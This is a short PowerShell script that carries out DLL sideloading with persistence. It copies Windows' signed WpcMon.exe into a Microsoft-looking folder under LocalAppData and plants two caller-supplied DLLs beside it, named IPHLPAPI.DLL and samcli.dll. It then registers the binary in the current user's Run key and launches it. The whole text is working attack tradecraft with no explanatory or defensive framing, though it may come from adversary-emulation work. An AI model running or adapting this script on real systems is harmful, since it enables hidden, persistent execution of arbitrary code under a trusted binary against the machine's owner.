param([string]$FirstDll, [string]$SecondDll)
New-Item -ItemType Directory -Force -Path "$env:LOCALAPPDATA\Microsoft\WpcMon"
Copy-Item "$env:WINDIR\System32\WpcMon.exe" "$env:LOCALAPPDATA\Microsoft\WpcMon\WpcMon.exe"
Copy-Item $FirstDll "$env:LOCALAPPDATA\Microsoft\WpcMon\IPHLPAPI.DLL"
Copy-Item $SecondDll "$env:LOCALAPPDATA\Microsoft\WpcMon\samcli.dll"
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WpcMon' -PropertyType String -Value "$env:LOCALAPPDATA\Microsoft\WpcMon\WpcMon.exe" -Force
Start-Process "$env:LOCALAPPDATA\Microsoft\WpcMon\WpcMon.exe"
